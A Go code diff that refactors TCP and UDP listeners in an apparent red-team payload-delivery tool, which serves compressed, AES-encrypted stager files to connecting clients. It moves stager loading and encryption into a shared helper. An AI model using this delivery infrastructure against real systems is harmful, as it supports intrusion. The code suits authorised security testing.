@@ -22,20 +22,10 @@ var (
 // keyStr: the passphrase to encrypt the stager file.
 // compression: whether to compress the stager file before encryption.
 func TCPAESCompressedListener(stagerPath string, port string, keyStr string, compression bool) error {
-	stager, err := os.ReadFile(stagerPath)
+	blob, err := buildServedBlob(stagerPath, keyStr, compression)
 	if err != nil {
-		return fmt.Errorf("failed to read stager file: %v", err)
+		return err
 	}
-
-	key := deriveKeyFromString(keyStr)
-
-	var toEncrypt []byte
-	if compression {
-		toEncrypt = compressData(stager)
-	} else {
-		toEncrypt = stager
-	}
-	encryptedStager := encryptData(toEncrypt, key)
 
 	listener, err := net.Listen("tcp", fmt.Sprintf(":%s", port))
 	if err != nil {
@@ -52,7 +42,7 @@ func TCPAESCompressedListener(stagerPath string, port string, keyStr string, com
 			continue
 		}
 
-		go handleTCPConnection(conn, encryptedStager)
+		go handleTCPConnection(conn, blob)
 	}
 }
 
@@ -102,20 +92,12 @@ func TCPBareListener(stagerPath string, port string) error {
 // keyStr: the passphrase to encrypt the stager file.
 // compression: whether to compress the stager file before encryption.
 func UDPAESCompressedListener(stagerPath string, port string, keyStr string, compression bool) error {
-	stager, err := os.ReadFile(stagerPath)
+	blob, err := buildServedBlob(stagerPath, keyStr, compression)
 	if err != nil {
-		return fmt.Errorf("failed to read stager file: %v", err)
+		return err
 	}
 
 	key := deriveKeyFromString(keyStr)
-
-	var toEncrypt []byte
-	if compression {
-		toEncrypt = compressData(stager)
-	} else {
-		toEncrypt = stager
-	}
-	encryptedStager := encryptData(toEncrypt, key)
 
 	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf(":%s", port))
 	if err != nil {
@@ -163,7 +145,7 @@ func UDPAESCompressedListener(stagerPath string, port string, keyStr string, com
 				if _, exists := udpSessions[remoteAddr.String()]; !exists {
 					ackChan := make(chan uint32, 10)
 					udpSessions[remoteAddr.String()] = ackChan
-					go handleUDPConnection(conn, remoteAddr, encryptedStager, ackChan)
+					go handleUDPConnection(conn, remoteAddr, blob, ackChan)
 				}
 				udpSessionsMutex.Unlock()
 			} else {
